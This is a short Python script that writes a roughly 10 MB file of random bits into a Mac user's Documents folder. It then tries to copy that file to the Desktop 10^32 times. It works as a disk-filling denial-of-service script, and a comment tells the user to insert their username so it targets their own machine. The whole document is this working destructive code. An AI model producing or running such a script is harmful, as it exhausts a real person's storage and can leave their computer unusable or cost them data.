import random
import shutil

def write_file(file_name, line_length=1000):
    with open(file_name, 'w') as file:
        for i in range(10000):
            for x in range(line_length):
                line_content = str(random.randint(0, 1))
                file.write(''+line_content)
            file.write('\n')

def multiply(file_name, dst_file, number):
    for i in range(number):
        shutil.copy(file_name, dst_file+str(i)+'.txt')
    
def main():
    file = "/users/USERNAME/documents/test.py"
    newfile = "/users/USERNAME/desktop/test"
    # set the 'USERNAME' above to whatever the user you are logged in on for mac
    write_file(file)
    multiply(file, newfile, 100000000000000000000000000000000) 

if __name__ == "__main__":
    main()
